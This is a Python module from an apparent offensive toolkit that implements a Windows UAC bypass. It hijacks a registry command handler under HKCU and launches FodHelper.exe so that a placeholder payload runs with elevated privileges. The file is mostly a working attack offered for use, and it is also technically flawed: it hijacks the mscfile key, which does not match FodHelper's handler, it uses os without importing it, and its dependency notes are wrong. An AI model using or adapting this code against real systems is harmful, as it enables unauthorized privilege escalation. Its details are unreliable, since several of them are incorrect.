# modules/privilege-escalation/windows_uac_fodhelper_bypass.py

"""
Windows UAC Bypass via FodHelper Registry Hijack

This exploit hijacks the per‐user COM handler for .msc files under
HKCU\Software\Classes\mscfile\shell\open\command to launch an arbitrary
command with elevated privileges when FodHelper.exe is invoked.

Requirements:
  * Windows 7+ with UAC enabled
  * No administrator privileges
  * pywin32      (pip install pywin32)
"""

import time
import subprocess
from typing import Dict, Any

import winreg

from modules.exploits.exploit_template import Exploit, ExploitResult
from core.logging import setup_logger

logger = setup_logger(__name__, default_level="INFO")


class WindowsUACFodhelperBypass(Exploit):
    name = "Windows UAC Bypass (FodHelper)"
    description = (
        "Hijack the FodHelper.exe COM handler by creating HKCU registry keys "
        "to execute a payload with elevated privileges."
    )
    target_platforms = ["Windows"]
    severity = "High"
    requires_auth = False
    metadata: Dict[str, Any] = {
        "cve_id": None,
        "references": [
            "https://attack.mitre.org/techniques/T1548/002/",
            "https://github.com/SecWiki/windows-kernel-exploits"
        ],
        "mitigation_steps": [
            "Use AppLocker or SRP to block FodHelper.exe",
            "Monitor registry changes under HKCU\\Software\\Classes"
        ]
    }

    ROOT_KEY = winreg.HKEY_CURRENT_USER
    SUB_KEY = r"Software\Classes\mscfile\shell\open\command"
    PAYLOAD_CMD = r"cmd.exe /c start cmd.exe"  # your elevated payload here

    def check(self) -> bool:
        # Confirm OS is Windows and FodHelper exists
        try:
            system_root = subprocess.check_output(
                ["cmd", "/c", "echo %SystemRoot%"], text=True
            ).strip()
            fod_path = fr"{system_root}\System32\FodHelper.exe"
            logger.debug("Checking FodHelper path: %s", fod_path)
            return os.path.exists(fod_path)
        except Exception as e:
            logger.error("Error checking FodHelper existence: %s", e, exc_info=True)
            return False

    def exploit(self) -> ExploitResult:
        """
        1. Create the registry hijack under HKCU.
        2. Launch FodHelper.exe (auto-elevates from HKCU keys).
        3. Clean up registry keys after a short delay.
        """
        try:
            # 1) Create/open key
            logger.info("Creating registry key for hijack...")
            key = winreg.CreateKey(self.ROOT_KEY, self.SUB_KEY)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.PAYLOAD_CMD)
            winreg.CloseKey(key)
            logger.debug("Registry hijack set: default -> %s", self.PAYLOAD_CMD)

            # 2) Launch FodHelper (will auto-elevate)
            logger.info("Launching FodHelper.exe to trigger payload...")
            subprocess.Popen(["FodHelper.exe"])
            time.sleep(2)  # wait for UAC elevation to spawn

            # 3) Cleanup
            logger.info("Cleaning up registry hijack...")
            winreg.DeleteKey(self.ROOT_KEY, self.SUB_KEY)
            logger.debug("Registry key %s removed", self.SUB_KEY)

            return ExploitResult(True, "Payload executed with elevated privileges.")
        except Exception as e:
            logger.error("UAC bypass failed: %s", e, exc_info=True)
            # Attempt cleanup if partial
            try:
                winreg.DeleteKey(self.ROOT_KEY, self.SUB_KEY)
            except Exception:
                pass
            return ExploitResult(False, f"Exception during exploit: {e}")
